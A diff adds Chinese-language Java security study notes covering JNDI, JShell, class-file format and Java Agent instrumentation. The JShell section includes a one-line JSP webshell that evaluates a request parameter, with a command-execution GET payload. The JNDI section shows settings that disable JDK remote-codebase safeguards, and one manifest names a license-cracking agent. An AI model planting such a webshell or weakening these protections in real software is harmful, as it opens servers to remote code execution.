@@ -1205,7 +1205,7 @@ RMI底层通讯采用了Stub(客户端)和Skeleton(服务端)机制，RMI调用�
 
 ### RMI 反序列化漏洞
 
-RMI通信中所有的对象都是通过Java序列化传输的，因此RMI存在反序列化漏洞。攻击者可以通过构造恶意序列化数据，触发服务端反序列化漏洞，导致服务端远程代码执行。具体利用链可参考[《Apache Common Collections反序列化》](/Sec/Vul/Web/Deserial/ACC/#2-cc1-lazymap)
+RMI通信中所有的对象都是通过Java序列化传输的，因此RMI存在反序列化漏洞。攻击者可以通过构造恶意序列化数据，触发服务端反序列化漏洞，导致服务端远程代码执行。具体利用链可参考[《Apache Common Collections反序列化》](/Sec/Web/Deserial/ACC/#2-cc1-lazymap)
 
 ??? node "PoC"
 
@@ -1434,3 +1434,326 @@ JRMP接口的两种常见实现方式：
 参考[PoC](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.java){target="_blank"}
 
 ## 1.12 JNDI
+
+JNDI(Java Naming and Directory Interface)是Java提供的`Java 命名和目录接口`。通过调用JNDI的API应用程序可以定位资源和其他程序对象。JNDI是Java EE的重要部分，需要注意的是它并不只是包含了DataSource(JDBC 数据源)，JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA。
+
+**Naming Service 命名服务**：
+
+命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。
+
+**Directory Service 目录服务**：
+
+目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。
+
+**Reference 引用**：
+
+在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。
+
+更多JNDI相关概念参考: [Java技术回顾之JNDI：命名和目录服务基本概念](https://blog.csdn.net/ericxyy/article/details/2012287){target="_blank"}
+
+### JNDI 目录服务
+
+访问JNDI目录服务时会通过预先设置好环境变量访问对应的服务， 如果创建JNDI上下文(Context)时未指定环境变量对象，JNDI会自动搜索系统属性(`System.getProperty()`)、`applet` 参数和应用程序资源文件(`jndi.properties`)
+
+???+ example
+
+    ```java
+    // 创建环境变量对象
+    Hashtable env = new Hashtable();
+
+    // 设置JNDI初始化工厂类名
+    env.put(Context.INITIAL_CONTEXT_FACTORY, "类名");
+
+    // 设置JNDI提供服务的URL地址
+    env.put(Context.PROVIDER_URL, "url");
+
+    // 创建JNDI目录服务对象
+    DirContext context = new InitialDirContext(env);
+    ```
+
+`Context.INITIAL_CONTEXT_FACTORY`(初始上下文工厂的环境属性名称)指的是JNDI服务处理的具体类名称，如：DNS服务可以使用`com.sun.jndi.dns.DnsContextFactory`类来处理，JNDI上下文工厂类必须实现`javax.naming.spi.InitialContextFactory`接口，通过重写`getInitialContext`方法来创建服务。
+
+1. **JNDI DNS服务**：
+    JNDI支持访问DNS服务，注册环境变量时设置JNDI服务处理的工厂类为`com.sun.jndi.dns.DnsContextFactory`即可。
+2. **JNDI-RMI远程方法调用**
+    RMI的服务处理工厂类是:`com.sun.jndi.rmi.registry.RegistryContextFactory`
+3. **JNDI-LDAP**
+   LDAP的服务处理工厂类是:`com.sun.jndi.ldap.LdapCtxFactory`
+4. **JNDI-DataSource**
+   JNDI连接数据源比较特殊，Java目前不提供内置的实现方法，提供数据源服务的多是Servlet容器，以Tomcat为例，参考[Tomcat JNDI Datasource](https://tomcat.apache.org/tomcat-8.0-doc/jndi-datasource-examples-howto.html){target="_blank"}
+
+### JNDI-协议转换
+
+如果`JNDI`在`lookup`时没有指定初始化工厂名称，会自动根据协议类型动态查找内置的工厂类然后创建处理对应的服务请求。
+
+`JNDI`默认支持自动转换的协议有：
+
+| 协议名称             | 协议URL        | Context类                                               |
+| -------------------- | -------------- | ------------------------------------------------------- |
+| DNS协议              | `dns://`       | `com.sun.jndi.url.dns.dnsURLContext`                    |
+| RMI协议              | `rmi://`       | `com.sun.jndi.url.rmi.rmiURLContext`                    |
+| LDAP协议             | `ldap://`      | `com.sun.jndi.url.ldap.ldapURLContext`                  |
+| LDAP协议             | `ldaps://`     | `com.sun.jndi.url.ldaps.ldapsURLContextFactory`         |
+| IIOP对象请求代理协议 | `iiop://`      | `com.sun.jndi.url.iiop.iiopURLContext`                  |
+| IIOP对象请求代理协议 | `iiopname://`  | `com.sun.jndi.url.iiopname.iiopnameURLContextFactory`   |
+| IIOP对象请求代理协议 | `corbaname://` | `com.sun.jndi.url.corbaname.corbanameURLContextFactory` |
+
+### JNDI-Reference
+
+在JNDI服务中允许使用系统以外的对象，比如在某些目录服务中直接引用远程的Java对象，但遵循一些安全限制。
+
+#### RMI/LDAP远程对象引用安全限制
+
+在RMI服务中引用远程对象将受本地Java环境限制即本地的`java.rmi.server.useCodebaseOnly`配置必须为false(允许加载远程对象)，如果该值为true则禁止引用远程对象。除此之外被引用的ObjectFactory对象还将受到`com.sun.jndi.rmi.object.trustURLCodebase`配置限制，如果该值为false(不信任远程引用对象)一样无法调用远程的引用对象。
+
+JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121开始`java.rmi.server.useCodebaseOnly`默认配置已经改为了true。
+JDK 6u132, JDK 7u122, JDK 8u113开始`com.sun.jndi.rmi.object.trustURLCodebase`默认值已改为了false。
+本地测试远程对象引用可以使用如下方式允许加载远程的引用对象：
+```java
+System.setProperty("java.rmi.server.useCodebaseOnly", "false");
+System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+```
+
+LDAP在JDK 11.0.1、8u191、7u201、6u211后也将默认的`com.sun.jndi.ldap.object.trustURLCodebase`设置为了false。
+
+高版本JDK可参考：[如何绕过高版本 JDK 的限制进行 JNDI 注入利用](https://paper.seebug.org/942/){target="_blank"}
+
+JNDI 注入漏洞参考：[JNDI 注入漏洞](/Sec/Web/Deserial/JNDI/#JNDI-注入漏洞)
+
+## 1.13 JShell
+
+从Java 9开始提供了一个叫jshell的功能，jshell是一个REPL(Read-Eval-Print Loop)命令行工具，提供了一个交互式命令行界面，在jshell中我们不再需要编写类也可以执行Java代码片段，开发者可以像python和php一样在命令行下愉快的写测试代码了。
+
+命令行执行jshell即可进入jshell模式：
+
+![alt text](img/jshell.png){width=80% loading=lazy}
+
+??? example "使用JShell执行代码片段"
+
+    jshell不仅是一个命令行工具，在我们的应用程序中同样也可以调用jshell内部的实现API，也就是说我们可以利用jshell来执行Java代码片段
+
+    jshell.jsp一句话木马示例:
+
+    ```jsp
+    <%=jdk.jshell.JShell.builder().build().eval(request.getParameter("src"))%>
+    ```
+
+    ```java title="GET 请求"
+    ?src=new String(Runtime.getRuntime().exec("pwd").getInputStream().readAllBytes())
+    ```
+
+## 1.14 Java 字节码
+
+Java源文件(*.java)通过编译后会变成class文件，class文件有固定的二进制格式，class文件的结构在JVM虚拟机规范第四章[The class File Format](https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-4.html){target="_blank"}中有详细的说明。本章节将学习class文件结构、class文件解析、class文件反编译以及ASM字节码库。(1)
+{ .annotate }
+
+1. [Java规范文档](https://docs.oracle.com/javase/specs/)
+
+
+### Java class文件格式
+
+class文件结构如下：
+
+```java
+ClassFile {
+    u4 magic; // (1)!
+    u2 minor_version;
+    u2 major_version; // (2)!
+    u2 constant_pool_count; // (3)!
+    cp_info constant_pool[constant_pool_count-1]; // (4)!
+    u2 access_flags; // (5)!
+    u2 this_class; // (6)!
+    u2 super_class; // (7)!
+    u2 interfaces_count; // (8)!
+    u2 interfaces[interfaces_count]; // (9)!
+    u2 fields_count; // (10)!
+    field_info fields[fields_count];// (11)!
+    u2 methods_count;// (12)!
+    method_info methods[methods_count];// (13)!
+    u2 attributes_count;// (14)!
+    attribute_info attributes[attributes_count];// (15)!
+}
+```
+
+1. 魔数是class文件的标识符，固定值为`0xCAFEBABE`，JVM加载class文件时会先读取魔数校验文件类型。
+2. class文件的版本号由两个u2组成（`u2 minor_version`, `u2 major_version`），分别表示的是副版本号和主版本号
+3. `u2 constant_pool_count`表示的是常量池中的数量，`constant_pool_count`的值等于常量池中的数量加1，需要特别注意的是long和double类型的常量池对象占用两个常量位。
+4. `cp_info constant_pool[constant_pool_count-1]`是一种表结构，cp_info表示的是常量池对象。[u1 tag : u1 info], 每种tag表示一种数据类型，具体参考手册
+5. `u2 access_flags` 表示类或者接口的访问权限及属性。
+6. `u2 this_class`表示当前class文件的类名所在常量池中的索引位置
+7. `u2 super_class`表示当前class文件的父类类名所在常量池中的索引位置。`java.lang.Object`类的super_class的为0
+8. `u2 interfaces_count`表示当前类继承或实现的接口数
+9. `u2 interfaces[interfaces_count]`表示所有接口数组
+10. `u2 fields_count`表示当前class中的成员变量个数
+11. `field_info fields[fields_count]`表示当前类的所有成员变量
+    ```java
+    field_info {
+        u2 access_flags;
+        u2 name_index;
+        u2 descriptor_index;
+        u2 attributes_count;
+        attribute_info attributes[attributes_count];
+    }
+    ```
+    **属性结构：**
+    1. `u2 access_flags;`表示的是成员变量的修饰符；
+    2. `u2 name_index;`表示的是成员变量的名称；
+    3. `u2 descriptor_index;`表示的是成员变量的描述符；
+    4. `u2 attributes_count;`表示的是成员变量的属性数量；
+    5. `attribute_info attributes[attributes_count];`表示的是成员变量的属性信息；
+12. `u2 methods_count`表示当前class中的成员方法个数。
+13. `method_info methods[methods_count]`表示的是当前class中的所有成员方法
+    **method_info数据结构：**
+    ```
+    method_info {
+    u2 access_flags;
+    u2 name_index;
+    u2 descriptor_index;
+    u2 attributes_count;
+    attribute_info attributes[attributes_count];
+    }
+    ```
+    **属性结构：**
+    1. `u2 access_flags;`表示的是成员方法的修饰符；
+    2. `u2 name_index;`表示的是成员方法的名称；
+    3. `u2 descriptor_index;`表示的是成员方法的描述符；
+    4. `u2 attributes_count;`表示的是成员方法的属性数量；
+    5. `attribute_info attributes[attributes_count];`表示的是成员方法的属性信息；
+14. `u2 attributes_count`表示当前class文件属性表的成员个数。
+15. `attribute_info attributes[attributes_count];`表示的是当前class文件的所有属性
+    **`attribute_info`数据结构：**
+    ```
+    attribute_info {
+    u2 attribute_name_index;
+    u4 attribute_length;
+    u1 info[attribute_length];
+    }
+    ```
+    `u2 attribute_name_index;`表示的是属性名称索引，读取`attribute_name_index`值所在常量池中的名称可以得到属性名称。
+
+在JVM规范中`u1`、`u2`、`u4`分别表示的是1、2、4个字节的无符号数，可使用`java.io.DataInputStream`类中的对应方法：`readUnsignedByte`、`readUnsignedShort`、`readInt`方法读取。表结构(`table`)由任意数量的可变长度的项组成，用于表示class中的复杂结构，如上述的：`cp_info`、`field_info`、`method_info`、`attribute_info`。
+
+### Java class文件解析
+
+[Todo](/todo)
+{ .annotate }
+
+1. 巨长，特别是属性解析部分，需要时间整理（前面的世界以后再来探索吧）
+
+### JVM指令集
+
+#### 类型/方法描述符
+
+**类型描述符表**
+
+| 描述符   | Java类型       | 示例                 |
+| -------- | -------------- | -------------------- |
+| `B`      | `byte`         | `B`                  |
+| `C`      | `char`         | `C`                  |
+| `D`      | `double`       | `D`                  |
+| `F`      | `float`        | `F`                  |
+| `I`      | `int`          | `I`                  |
+| `J`      | `long`         | `J`                  |
+| `S`      | `short`        | `S`                  |
+| `Z`      | `boolean`      | `Z`                  |
+| `[`      | `数组`         | `[IJ`                |
+| `L类名;` | `引用类型对象` | `Ljava/lang/Object;` |
+
+**方法描述符示例**
+
+| 方法示例                            | 描述符                                   | 描述                      |
+| ----------------------------------- | ---------------------------------------- | ------------------------- |
+| `static{...}`，`static int id = 1;` | 方法名：`<clinit>`                       | 静态语句块/静态变量初始化 |
+| `public Test (){...}`               | 方法名：`<init>`，描述符`()V`            | 构造方法                  |
+| `void hello(){...}`                 | `()V`                                    | `V`表示`void`，无返回值   |
+| `Object login(String str) {...}`    | `(Ljava/lang/String;)Ljava/lang/Object;` | 普通方法，返回Object类型  |
+| `void login(String str) {...}`      | `(Ljava/lang/String;)V`                  | 普通方法，无返回值        |
+
+#### JVM指令
+
+参见官方文档（之前安卓逆向的时候看过一点）
+
+### [Java 类字节码编辑](java_asm)
+
+## 1.15 Java Agent
+
+`JDK1.5`开始，`Java`新增了`Instrumentation(Java Agent API)`和`JVMTI(JVM Tool Interface)`功能，允许`JVM`在加载某个`class文件`之前对其字节码进行修改，同时也支持对已加载的`class(类字节码)`进行重新加载(`Retransform`)。
+
+利用`Java Agent`这一特性衍生出了`APM(Application Performance Management，应用性能管理)`、`RASP(Runtime application self-protection，运行时应用自我保护)`、`IAST(Interactive Application Security Testing，交互式应用程序安全测试)`等相关产品，它们都无一例外的使用了`Instrumentation/JVMTI`的`API`来实现动态修改`Java类字节码`并插入监控或检测代码。
+
+**`Java Agent`有两种运行模式：**
+
+1. 启动`Java程序`时添加`-javaagent(Instrumentation API实现方式)`或`-agentpath/-agentlib(JVMTI的实现方式)`参数，如`java -javaagent:/data/XXX.jar LingXeTest`。
+2. `JDK1.6`新增了`attach(附加方式)`方式，可以对运行中的`Java进程`附加`Agent`。
+
+这两种运行方式的最大区别在于第一种方式只能在程序启动时指定`Agent`文件，而`attach`方式可以在`Java程序`运行后根据`进程ID`动态注入`Agent`到`JVM`。
+
+Java Agent和普通的Java类相似，`premain`（Agent模式）和`agentmain`（Attach模式）为Agent程序的入口，如下：
+
+```java
+public static void premain(String args, Instrumentation inst) {}
+public static void agentmain(String args, Instrumentation inst) {}
+```
+
+Java Agent限制必须以jar包的形式运行或加载。此外，Java Agent强制要求所有的jar文件中必须包含`/META-INF/MANIFEST.MF`文件，且该文件中需要定义`Premain-Class`（Agent模式）或`Agent-Class:`（Agent模式）配置，如：
+
+```java
+Premain-Class: cc.agent.CrackLicenseAgent
+Agent-Class: cc.agent.CrackLicenseAgent
+```
+
+如果需要修改已经被JVM加载过的类的字节码，需要在设置`MANIFEST.MF`中添加`Can-Retransform-Classes: true`或`Can-Redefine-Classes: true`。
+
+### Instrumentation
+
+`java.lang.instrument.Instrumentation`是监测`JVM`中运行程序的`API`，功能如下：
+
+1. 动态添加或移除自定义的`ClassFileTransformer`（`addTransformer/removeTransformer`），JVM会在类加载时调用Agent中注册的`ClassFileTransformer`；
+2. 动态修改`classpath`（`appendToBootstrapClassLoaderSearch`、`appendToSystemClassLoaderSearch`），将Agent程序添加到`BootstrapClassLoader`和`SystemClassLoaderSearch`（对应的是`ClassLoader类的getSystemClassLoader方法`，默认是`sun.misc.Launcher$AppClassLoader`）中搜索；
+3. 动态获取所有`JVM`已加载的类(`getAllLoadedClasses`)；
+4. 动态获取某个类加载器已实例化的所有类(`getInitiatedClasses`)。
+5. 重定义某个已加载的类的字节码(`redefineClasses`)。
+6. 动态设置`JNI`前缀(`setNativeMethodPrefix`)，可以实现Hook native方法。
+7. 重新加载某个已经被JVM加载过的类字节码`retransformClasses`。
+
+## ClassFileTransformer
+
+`java.lang.instrument.ClassFileTransformer`是一个转换类文件的代理接口，我们可以在获取到`Instrumentation`对象后通过`addTransformer`方法添加自定义类文件转换器。
+
+`addTransformer`可以注册自定义的`Transformer`到`Java Agent`，当有新的类被`JVM`加载时`JVM`会自动回调`Transformer`类的`transform`方法，传入该类的`transform`信息(`类名、类加载器、类字节码`等)，我们可以根据传入的类信息决定是否需要修改类字节码，修改完字节码后将新的类字节码返回给`JVM`，`JVM`会验证类和相应的修改是否合法，如果符合类加载要求`JVM`会加载修改后的类字节码。
+
+???+ example "ClassFileTransformer"
+
+    ```java
+    package java.lang.instrument;
+
+    public interface ClassFileTransformer {
+    
+    /**
+         * 类文件转换方法，重写transform方法可获取到待加载的类相关信息
+         *
+         * @param loader              定义要转换的类加载器；如果是引导加载器，则为 null
+         * @param className           类名,如:java/lang/Runtime
+         * @param classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null
+         * @param protectionDomain    要定义或重定义的类的保护域
+         * @param classfileBuffer     类文件格式的输入字节缓冲区（不得修改）
+         * @return 字节码byte数组。
+         */
+        byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
+                                ProtectionDomain protectionDomain, byte[] classfileBuffer);
+    
+    }
+    ```
+
+!!! Warning
+
+    **重写`transform`方法需要注意以下事项：**
+
+    1. `ClassLoader`如果是被`Bootstrap ClassLoader(引导类加载器)`所加载那么`loader`参数的值是空。
+    2. 修改类字节码时需要特别注意插入的代码在对应的`ClassLoader`中可以正确的获取到，否则会报`ClassNotFoundException`，比如修改`java.io.FileInputStream(该类由Bootstrap ClassLoader加载)`时插入了我们检测代码，那么我们将必须保证`FileInputStream`能够获取到我们的检测代码类。
+    3. `JVM`类名的书写方式路径方式：`java/lang/String`而不是我们常用的类名方式：`java.lang.String`。
+    4. 类字节必须符合`JVM`校验要求，如果无法验证类字节码会导致`JVM`崩溃或者`VerifyError(类验证错误)`。
+    5. 如果修改的是`retransform`类(修改已被`JVM`加载的类)，修改后的类字节码不得`新增方法`、`修改方法参数`、`类成员变量`。
+    6. `addTransformer`时如果没有传入`retransform`参数(默认是`false`)就算`MANIFEST.MF`中配置了`Can-Redefine-Classes: true`而且手动调用了`retransformClasses`方法也一样无法`retransform`。
+    7. 卸载`transform`时需要使用创建时的`Instrumentation`实例。
+
